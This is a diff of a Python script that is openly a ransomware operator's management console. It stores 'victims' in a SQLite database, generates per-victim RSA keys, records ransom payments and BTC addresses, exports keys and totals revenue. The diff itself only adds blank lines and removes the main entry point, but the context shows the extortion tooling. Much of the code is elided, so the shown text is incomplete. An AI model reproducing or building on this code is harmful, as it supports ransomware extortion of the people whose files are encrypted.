@@ -27,11 +27,15 @@ DB_FILE = "victims.db"
 KEY_SIZE = 4096
 EXPORT_DIR = "exported_keys"
 
+
+
+
 def init_database():
     """Initialize SQLite database for victims"""
     conn = sqlite3.connect(DB_FILE)
     cursor = conn.cursor()
     
+
     cursor.execute('''
         CREATE TABLE IF NOT EXISTS victims (
             victim_id TEXT PRIMARY KEY,
@@ -61,6 +65,10 @@ def init_database():
     conn.commit()
     conn.close()
     print(f"[+] Database initialized: {DB_FILE}")
+
+
+
+
 
 def generate_rsa_keys():
     """Generate RSA key pair (4096-bit)"""
@@ -93,11 +101,18 @@ def generate_rsa_keys():
         print(f"[ERROR] Key generation failed: {e}")
         return None, None
 
+
+
 def generate_victim_id(ip="0.0.0.0", system_info=""):
     """Generate unique victim ID"""
     unique_data = f"{ip}_{time.time()}_{secrets.randbelow(1000000)}_{platform.node()}"
     victim_hash = hashlib.sha256(unique_data.encode()).hexdigest()[:24]
     return f"{victim_hash[:8]}-{victim_hash[8:12]}-{victim_hash[12:16]}-{victim_hash[16:20]}-{victim_hash[20:24]}"
+
+
+
+
+
 
 def create_victim(system_info="", ip="0.0.0.0"):
     """Create new victim entry with RSA keys"""
@@ -130,6 +145,9 @@ def create_victim(system_info="", ip="0.0.0.0"):
     
     return victim_id
 
+
+
+
 def get_victim(victim_id):
     """Retrieve victim data from database"""
     conn = sqlite3.connect(DB_FILE)
@@ -138,6 +156,8 @@ def get_victim(victim_id):
     victim = cursor.fetchone()
     conn.close()
     return victim
+
+
 
 def list_victims():
     """List all victims in database"""
@@ -151,6 +171,9 @@ def list_victims():
     victims = cursor.fetchall()
     conn.close()
     return victims
+
+
+
 
 def update_status(victim_id, status, notes=""):
     """Update victim payment status"""
@@ -176,6 +199,9 @@ def update_status(victim_id, status, notes=""):
         print(f"[+] Status updated for {victim_id}: {status}")
         return True
     return False
+
+
+
 
 def mark_paid(victim_id, btc_address=""):
     """Mark victim as paid and optionally set BTC address"""
@@ -208,6 +234,9 @@ def mark_paid(victim_id, btc_address=""):
         print(f"[+] Marked as paid: {victim_id}")
         return True
     return False
+
+
+
 
 def export_keys(victim_id, output_dir=EXPORT_DIR):
     """Export victim keys to PEM files"""
@@ -245,6 +274,10 @@ def export_keys(victim_id, output_dir=EXPORT_DIR):
     
     return True
 
+
+
+
+
 def delete_victim(victim_id):
     """Delete victim from database"""
     confirm = input(f"Delete victim {victim_id}? (yes/no): ")
@@ -267,6 +300,10 @@ def delete_victim(victim_id):
     
     print(f"[ERROR] Victim not found: {victim_id}")
     return False
+
+
+
+
 
 def get_statistics():
     """Get ransomware statistics"""
@@ -294,6 +331,10 @@ def get_statistics():
         'total_revenue': revenue
     }
 
+
+
+
+
 def display_victim_details(victim_id):
     """Display detailed victim information"""
     victim = get_victim(victim_id)
@@ -319,6 +360,9 @@ def display_victim_details(victim_id):
     print("\nPrivate Key (first 80 chars):")
     print(f"{victim[2][:80]}...")
     print("="*60)
+
+
+
 
 def interactive_menu():
     """Interactive command-line interface"""
@@ -393,5 +437,7 @@ def interactive_menu():
         except Exception as e:
             print(f"[ERROR] {e}")
 
-if __name__ == "__main__":
-    interactive_menu()
+
+
+
+
